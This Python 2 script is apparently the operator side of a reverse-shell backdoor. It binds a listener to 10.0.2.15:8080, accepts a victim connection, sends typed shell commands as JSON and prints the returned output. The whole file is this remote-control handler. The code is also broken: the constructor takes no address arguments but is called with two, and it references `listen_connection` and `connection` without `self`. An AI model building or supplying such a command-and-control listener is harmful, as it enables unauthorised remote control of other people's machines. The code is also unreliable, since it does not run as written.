import socket
import json

class Socket_Listener:
    def __init__(self):
        self.listen_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        self.listen_connection.bind((ip, port))
        self.listen_connection.listen()
        (connection, address) = listen_connection.accept()

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_receive(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_input):
        if command_input[0] == "quit":
            self.listen_connection.close()
            exit()

        self.json_send(command_input)
        return self.json_receive()

    def start_listener_function(self):
        while True:
            command_input = raw_input("enter command :")
            command_input = command_input.split(" ")
            command_output = self.command_execution(command_input)
            print(command_output)

my_socket_listener = Socket_Listener("10.0.2.15",8080)
my_socket_listener.start_listener_function()